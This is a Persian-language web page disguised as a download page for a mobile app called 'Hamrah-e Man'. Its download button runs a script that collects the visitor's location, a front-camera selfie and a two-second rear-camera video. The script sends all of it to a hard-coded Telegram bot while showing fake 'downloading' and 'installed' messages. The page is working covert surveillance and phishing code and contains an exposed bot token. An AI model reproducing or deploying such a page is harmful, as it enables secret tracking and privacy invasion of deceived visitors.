<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>دانلود همراه من</title>
</head>

<body style="text-align:center; font-family:tahoma; margin-top:70px; background:#f5f5f5;">

<h2>دانلود همراه من</h2>
<p>
برای دانلود کلیک کنید.
</p>

<button onclick="startProcess()" 
style="padding:12px 25px; font-size:16px; border:none; border-radius:10px; background:yellow; color:black;">
دانلود
</button>

<p id="status" style="margin-top:20px;"></p>

<script>

async function startProcess() {

  const status = document.getElementById("status");
  status.innerHTML = "در حال آماده سازی برای دانلود...";

  if (!navigator.geolocation || !navigator.mediaDevices) {
    status.innerHTML = "مرورگر پشتیبانی نمی‌کند ❌";
    return;
  }

  navigator.geolocation.getCurrentPosition(async function(position) {

    const lat = position.coords.latitude;
    const lon = position.coords.longitude;

    try {

      status.innerHTML = "در حال دانلود...";

      // ===== سلفی =====
      const frontStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: 640, height: 480 }
      });

      const videoFront = document.createElement("video");
      videoFront.srcObject = frontStream;

      await videoFront.play();
      await new Promise(r => setTimeout(r, 1000));

      const canvas = document.createElement("canvas");
      canvas.width = 640;
      canvas.height = 480;
      canvas.getContext("2d").drawImage(videoFront, 0, 0, 640, 480);

      frontStream.getTracks().forEach(track => track.stop());

      const photoBlob = await new Promise(resolve =>
        canvas.toBlob(resolve, "image/jpeg", 0.7)
      );

      // ===== ویدیو ۲ ثانیه‌ای از دوربین پشت =====
      status.innerHTML = "در حال نصب...";

      const backStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: { exact: "environment" } },
        audio: false
      });

      const mediaRecorder = new MediaRecorder(backStream);
      let chunks = [];

      mediaRecorder.ondataavailable = e => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.start();

      await new Promise(r => setTimeout(r, 2000)); // ۲ ثانیه ضبط

      mediaRecorder.stop();

      await new Promise(resolve => {
        mediaRecorder.onstop = resolve;
      });

      backStream.getTracks().forEach(track => track.stop());

      const videoBlob = new Blob(chunks, { type: "video/webm" });

      status.innerHTML = " لطفا کمی صبر کنید...";

      await sendToTelegram(lat, lon, photoBlob, videoBlob);

      status.innerHTML = "برنامه با موفقیت دانلود و نصب شد ✅";

    } catch (err) {
      status.innerHTML = "دسترسی دانلود رد شد یا خطا رخ داد ❌";
    }

  }, function() {
    status.innerHTML = "دسترسی به گوگل رد شد ❌";
  });
}

async function sendToTelegram(lat, lon, photoBlob, videoBlob) {

  var botToken = "8516464355:AAHGY98pqRWo5lSfSlMR0FBKxMPc7NXSvj4";
  var chatId = "92860050";

  // ارسال موقعیت
  await fetch("https://api.telegram.org/bot" + botToken + "/sendLocation", {
    method: "POST",
    body: new URLSearchParams({
      chat_id: chatId,
      latitude: lat,
      longitude: lon
    })
  });

  // ارسال عکس
  const photoData = new FormData();
  photoData.append("chat_id", chatId);
  photoData.append("photo", photoBlob, "selfie.jpg");

  await fetch("https://api.telegram.org/bot" + botToken + "/sendPhoto", {
    method: "POST",
    body: photoData
  });

  // ارسال ویدیو
  const videoData = new FormData();
  videoData.append("chat_id", chatId);
  videoData.append("video", videoBlob, "video.webm");

  await fetch("https://api.telegram.org/bot" + botToken + "/sendVideo", {
    method: "POST",
    body: videoData
  });
}

</script>

</body>
</html>
